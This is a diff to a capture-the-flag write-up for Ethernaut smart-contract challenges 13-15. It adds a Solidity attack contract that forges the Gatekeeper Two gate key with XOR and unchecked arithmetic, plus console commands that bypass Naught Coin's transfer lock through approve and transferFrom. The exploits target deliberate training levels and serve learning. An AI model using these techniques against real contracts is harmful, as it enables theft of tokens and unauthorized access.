@@ -434,6 +434,10 @@ Again, we are confronted with the fact that you can't keep any data private when
 Tasks:
 - Make it past the gatekeeper and register as an entrant to pass this level.
 
+Helpful Resources:
+- [Solution Video](https://www.youtube.com/watch?v=TH3ZeWcISmY)
+- [Gatekeeper One Solution](https://cyanwingsbird.blog/solidity/ethernaut/13-gatekeeper-one/)
+
 **Solution:** \
 Attack Payload:
 ```
@@ -495,4 +499,56 @@ contract AreYouTheKeymaster{
     
 }
 ```
+
+
+
+# 14. [Challenge 14: Gatekeeper Two](https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d)
+
+Tasks:
+- This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
+
+Helpful Resources:
+- [Gatekeeper Two Solution](https://cyanwingsbird.blog/solidity/ethernaut/14-gatekeeper-two/)
+
+**Solution:** \
+Attack Payload:
+```
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperTwo {
+    address levelInstance;
+    
+    constructor(address _levelInstance) {
+      levelInstance = _levelInstance;
+      unchecked{
+          bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
+          IGatekeeperTwo(levelInstance).enter(key);
+      }
+    }
+}
+```
+
+`^` is `Bitwise XOR` , so `a^b=c`, then `a^c=b`. Also, since `Solidity 0.8` , operations come with built-in underflow and overflow checks. Therefore, it is necessary to include the operation part with `unchecked {}`, otherwise the above operation will cause the transaction to fail. 
+
+
+
+# 15. [Challenge 15: Naught Coin](https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218)
+
+Tasks:
+- NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
+
+**Solution:** \
+Payload for CMD line:
+```
+await contract.approve(player, "1000000000000000000000000")
+await contract.transferFrom(player, "0x5206e78b21Ce315ce284FB24cf05e0585A93B1d9", "1000000000000000000000000")
+
+To check allowed token to transfer: (await contract.allowance(player, player)).toString()
+```
+
+ERC20 has 3 optional function and 6 mandatory function. In the CTF contract only `transfer` function has `lockTokens ` modifier but we can use `approve` function approve other user to spend the tokens for this challenge we approve ourselves for spender and then we can use `transferFrom` function to send all token to any address to solve the challenge.
 
